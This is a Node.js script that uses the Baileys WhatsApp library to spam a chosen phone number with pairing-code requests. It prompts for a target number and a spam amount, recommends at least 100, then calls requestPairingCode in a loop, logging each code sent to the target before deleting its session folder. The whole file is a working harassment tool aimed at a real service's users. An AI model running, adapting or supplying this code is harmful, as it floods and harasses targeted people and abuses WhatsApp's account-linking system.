const {
    default: makeWASocket,
    useMultiFileAuthState
} = require('@whiskeysockets/baileys');
const Pino = require('pino');
const fs = require('fs');
const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const question = (query) => new Promise((resolve) => {
    rl.question(query, (answer) => {
        resolve(answer);
    });
});

const askForSpamAmount = async() => {
    let spamAmount;
    do {
        console.log('Input spam amount (I recommend setting the minimum spam count to 100 to ensure the code runs smoothly.)');
        spamAmount = await question('Input spam amount: ');
        spamAmount = parseInt(spamAmount);
        if(spamAmount < 0) {
            console.log('Spam amount cannot be below 1!');
        }
    } while (spamAmount < 0);
    return spamAmount;
}

const deleteSessionFolder = async() => {
    fs.rmSync('session', { recursive: true, force: true });
}

const connectToWhatsApp = async() => {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const conn = makeWASocket({
        logger: Pino({ level: 'silent' }),
        browser: ['Linux', 'Chrome', ''],
        auth: state,
        defaultQueryTimeoutMs: undefined,
        syncFullHistory: false
    });
    let targetNumber
    if(!conn.user && !conn.authState.creds.registered) {
        const connectWithCode = async() => {
            console.log('Input target number (Example: 62823456789)');
            targetNumber = await question('Input target number: ');
            let spamAmount = await askForSpamAmount();
            console.log('Spam will started in 3 seconds...');
            await new Promise(resolve => setTimeout(resolve, 3e3));
            try {
                for(let i = 1; i <= spamAmount; i++) {
                    let code = await conn.requestPairingCode(targetNumber);
                    code = code?.match(/.{1,4}/g)?.join('-') || code;
                    console.log(i + '. The pairing code has been successfully sent to: ' + targetNumber);
                    if(i === spamAmount) {
                        console.log('Spam completed. Stopping...');
                        deleteSessionFolder();
                        process.exit(0);
                    }
                }
            } catch (e) {
                console.log('Error while requesting pairing code: ' + e);
            } finally {
                rl.close();
            }
        }
        await connectWithCode();
    }
    conn.ev.on('connection.update', (c) => {
        const { connection } = c;
        if(connection === 'close') {
            console.log('Connection closed, trying to reconnect again...');
            connectToWhatsApp();
        }
        if(connection === 'open') {
            console.log('Connected: ' + conn.user.id.split(':')[0]);
        }
    });
    conn.ev.on('creds.update', saveCreds);
}
connectToWhatsApp();
